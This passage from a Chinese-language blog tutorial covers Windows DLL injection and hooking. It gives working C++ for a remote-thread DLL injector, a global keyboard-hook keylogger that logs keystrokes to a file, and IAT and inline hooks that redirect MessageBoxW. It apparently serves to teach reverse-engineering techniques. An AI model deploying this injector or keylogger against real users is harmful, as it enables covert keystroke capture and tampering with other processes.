class="built_in">CreateRemoteThread</span>(hProcess, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, str, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;thread create err !!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//一直等待线程结束</span></span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//扫尾</span></span><br><span class="line">	<span class="built_in">VirtualFreeEx</span>(hProcess, str, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后写一个dll具体实现，就能将其注入了；</p>
<h2 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h2><p>钩子，和网络上的抓包很类似，在上下文中设置hook，即可捕获了解到其中的执行信息；</p>
<h3 id="消息-hook"><a href="#消息-hook" class="headerlink" title="消息 hook"></a>消息 hook</h3><p>你已经知道windows是基于消息操作的，也可以叫基于事件操作，那么将钩子设置在消息队列和进程之间的消息传输中，就叫消息hook；</p>
<p>windows提供了消息hook的API，只需要会用就行；</p>
<table>
<thead>
<tr>
<th>API</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>SetWindowsHookEx</td>
<td>设置钩子</td>
</tr>
<tr>
<td>CallNextHookEx</td>
<td>传递钩子信息到钩子链的下一个子程序</td>
</tr>
<tr>
<td>UnHookWindowsHookEx</td>
<td>卸载钩子</td>
</tr>
</tbody></table>
<p>其中有个特点需要了解：</p>
<p>进程如果被hook，那么<strong>有关其hook的dll会被强制归属于该进程</strong>，所以hook一般也写在dll中，也是一种dll注入的手段；</p>
<p>来看一个键盘记录器的实际代码；</p>
<p>首先是dll程序主函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,					<span class="comment">//实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,		<span class="comment">//调用原因或可以说是时机</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved				<span class="comment">//保留字段</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:		<span class="comment">//创建进程时执行</span></span><br><span class="line">            g_hInstance = hModule;		<span class="comment">//之后hook函数需要用到的实例句柄</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后分别是hook的设置，处理，以及卸载；</p>
<p>设置HOOK：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//填0全局hook，这里选用键盘消息的勾取</span></span><br><span class="line">    g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_hHook)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用回调函数处理捕获信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ <span class="keyword">int</span>    code,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//键帽按下状态</span></span><br><span class="line">        <span class="keyword">if</span> ((lParam &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//将虚拟键转换为字符</span></span><br><span class="line">            BYTE KeyState[<span class="number">256</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">GetKeyboardState</span>(KeyState))</span><br><span class="line">            &#123;</span><br><span class="line">                LONG keyinfo = lParam;</span><br><span class="line">                UINT keyCode = (keyinfo &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00ff</span>;</span><br><span class="line">                WCHAR wkeyCode = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">ToAscii</span>((UINT)wParam, keyCode, KeyState, (LPWORD)&amp;wkeyCode, <span class="number">0</span>);</span><br><span class="line">                CHAR strinfo[<span class="number">12</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                <span class="built_in">sprintf_s</span>(strinfo, _countof(strinfo), <span class="string">&quot;%c&quot;</span>, wkeyCode);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">//写到桌面，这样仅仅对ascii实用</span></span><br><span class="line">                FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="built_in">fopen_s</span>(&amp;fp, <span class="string">&quot;C://your//path//to//Desktop//hook_log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">                <span class="built_in">fwrite</span>(strinfo, <span class="number">1</span>, <span class="number">1</span>, fp);</span><br><span class="line">                <span class="built_in">fclose</span>(fp);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不处理给下一个钩子，类似于窗口的回调函数最后返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>卸载钩子：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>至此，一个拥有消息hook的dll文件产生了，再使用任意主程序调用即可；</p>
<h3 id="IAT-hook"><a href="#IAT-hook" class="headerlink" title="IAT hook"></a>IAT hook</h3><p>顾名思义，此hook是对于IAT而言，IAT即 import address table ，导入地址表，在程序变为进程时，此表存储了导入函数的地址，在磁盘形态时存储的则是其函数名称，或者序号；</p>
<p>利用该hook可以使得改变原程序调用函数为自定义函数，当然<strong>传参需要一致，调用约定需要一致</strong>；</p>
<p>先回顾下 IAT 结构：</p>
<p>先拿DOS头找到PE头，接着拿PE头找可选PE头，可选头最后一个字段是一个数组，其存放各种表的 rva；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;                 <span class="comment">// +0000h   -   数据的起始RVA</span></span><br><span class="line">    DWORD   Size;                           <span class="comment">// +0004h   -   数据块的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下标为1的元素即为导入表，利用rva跳转到表本身，同时注意表有多个，因为导入的dll会是多个，所以记得循环遍历；</p>
<p>导入表中的 FirstThunk即为 IAT，同时注意，IAT有多个函数地址，也需要一次循环遍历；</p>
<p><img src="https://s2.loli.net/2022/12/12/IEzTfDBN3FMZl7m.png" alt="IAT"></p>
<p>由此，寻找函数地址的函数为：（输入dll名和函数名以查询）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//32位程序用DWORD</span></span><br><span class="line"><span class="function">DWORD* <span class="title">GetIatAddr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* dllName, <span class="keyword">const</span> <span class="keyword">char</span>* dllFunName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取本进程的句柄，也就是载入的exe文件</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">GetModuleHandleA</span>(<span class="number">0</span>);</span><br><span class="line">    DWORD buffer = (DWORD)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">//获取PE头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">//获取可选头</span></span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &amp;pNtHeader-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">//获取那个结构体数组</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY dataDirectory = &amp;pOptionalHeader-&gt;DataDirectory[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//获取导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)(dataDirectory-&gt;VirtualAddress + buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历导入表</span></span><br><span class="line">    <span class="keyword">while</span> (pImportTable-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span>* name = (<span class="keyword">char</span> *)(pImportTable-&gt;Name + buffer);</span><br><span class="line">        <span class="comment">//是否dll名相同</span></span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(name, dllName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//根据名字拿地址</span></span><br><span class="line">            <span class="comment">//获取INT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;OriginalFirstThunk + buffer);</span><br><span class="line">            <span class="comment">//获取IAT</span></span><br><span class="line">            PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pImportTable-&gt;FirstThunk + buffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//同步遍历INT和IAT</span></span><br><span class="line">            <span class="keyword">while</span> (pINT-&gt;u1.Function)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//按名导入</span></span><br><span class="line">                <span class="keyword">if</span> ((pINT-&gt;u1.Ordinal &amp; <span class="number">0x80000000</span>) == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pINT-&gt;u1.Function + buffer);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(pImportName-&gt;Name, dllFunName))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> (DWORD*)pIAT;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pINT++;</span><br><span class="line">                pIAT++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportTable++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着便是dllMain：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建进程时获取函数地址，此次修改的函数是MessageBoxW</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;注入成功！\n&quot;</span>);</span><br><span class="line">            <span class="comment">//获取函数地址</span></span><br><span class="line">            g_iatAddr = <span class="built_in">GetIatAddr</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">            g_preIatAddr = g_iatAddr;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置钩子</span></span><br><span class="line">            <span class="built_in">InstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//进程结束时卸载钩子</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="comment">//卸载钩子</span></span><br><span class="line">            <span class="built_in">UnInstallHook</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//更改函数地址</span></span><br><span class="line">    *g_iatAddr = (DWORD)Hack;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//还原更改的IAT</span></span><br><span class="line">    *g_iatAddr = (DWORD)g_preIatAddr;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Inline-hook"><a href="#Inline-hook" class="headerlink" title="Inline hook"></a>Inline hook</h3><p>IAT hook 是有缺陷的，即若导入函数无名就会失去作用；</p>
<p>而知道的是，IAT hook 的主要思路就是<strong>改变所hook函数的地址</strong>；</p>
<p>既然要hook一个函数，那么这个函数一定会调用，则inline hook 的主旨便是：</p>
<p>在<strong>进入目标函数时执行跳转</strong>，跳转到自实现函数里去；意思就是更改其第一条汇编码为 <code>jmp aimAddr</code> ;</p>
<p>具体实现则是更改其第一条指令对应的硬编码，也就是机械码，二进制内容；</p>
<p>对于<strong>32位程序的x86</strong>而言，jmp指令会占 5 个字节，第一个固定 E9 为 jmp指令，后面跟随的4个字节为偏移；</p>
<p>该偏移的计算公式为 ： offset = aimAddr - jmp指令的下一条地址;</p>
<p>也就是           ： <strong>offset = aimAddr - jmp指令地址 - 5</strong>;</p>
<p>那么主要的dll构造思路为：</p>
<ol>
<li>拿到目标函数地址，存档其前5字节内容，因为要恢复；</li>
<li>算出偏移并更改目标地址前5字节内容为跳转；</li>
<li>执行自实现函数的处理部分；</li>
<li>恢复5字节内容；</li>
</ol>
<p>由此全局存储变量：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分别是目标函数地址，保留5字节和修改5字节</span></span><br><span class="line">DWORD aimAddr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> oldBytes[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> newBytes[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br></pre></td></tr></table></figure>



<p>则有初始化函数实现思路中 1，2 中的算偏移：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="number">0</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="comment">//获取真实的地址</span></span><br><span class="line">    aimAddr = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="comment">//保留5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(oldBytes, (<span class="keyword">char</span>*)aimAddr, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//偏移搞定，hack为自定义函数</span></span><br><span class="line">    DWORD offset = (DWORD)Hack - aimAddr - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//修改5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;newBytes[<span class="number">1</span>], &amp;offset, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>装载和卸载钩子以实现 2，4：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//修改为跳转</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, newBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//恢复</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, oldBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后由自定义函数实现思路 3：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">Hack</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND    hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT    uType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用原本函数的输出想要的效果</span></span><br><span class="line">    <span class="built_in">UnInstallHook</span>();</span><br><span class="line">    <span class="keyword">int</span> result = <span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;hacker~&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">InstallHook</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理，进程创建时初始化和挂钩，进程结束时解钩；</p>
<p>总体来说写法会比 IAT hook 更轻松；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刚入门dll注入系列以及hook，开始发现很有意思；</p>
<p>注意啊，hook的函数需要和原函数保持一致，包括调用约定和参数！！！</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/">Windows编程</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-12-04</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Win/">Win</a></div></div><div class="post-content"><div class="main-content content"><p>重要头文件：windows.h；</p>
<p>word 是字，占2个字节；</p>
<p>不会的函数可以去微软查出来，vs里选中F1；</p>
<p>链接器 子系统 选择 窗口；</p>
<p>windows是操作<strong>消息</strong>的，它有一个消息队列，可获取如鼠标键盘产生的消息；</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
<li><p>UINT    unsigned int</p>
</li>
<li><p>DWORD   double word</p>
</li>
<li><p>PDWORD  pointer double word</p>
</li>
<li><p>BOOL     bool</p>
</li>
<li><p>short    short int</p>
</li>
<li><p>LRSULT   32 函数返回值</p>
</li>
<li><p>WPARAM LPARAM  32 消息参数</p>
</li>
<li><p>HANDLE    理解成windows对象，句柄</p>
</li>
<li><p>HWND      窗口句柄</p>
</li>
<li><p>HINSTANCE 实例句柄</p>
</li>
</ul>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hInstance,		<span class="comment">//程序的实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPreInstance,		<span class="comment">//上一个程序实例句柄（遗弃）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR lpCmdLine,			<span class="comment">//命令行参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> nCmdShow				<span class="comment">//显示方式（最大化，窗口）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<p>参数一个不能少；</p>
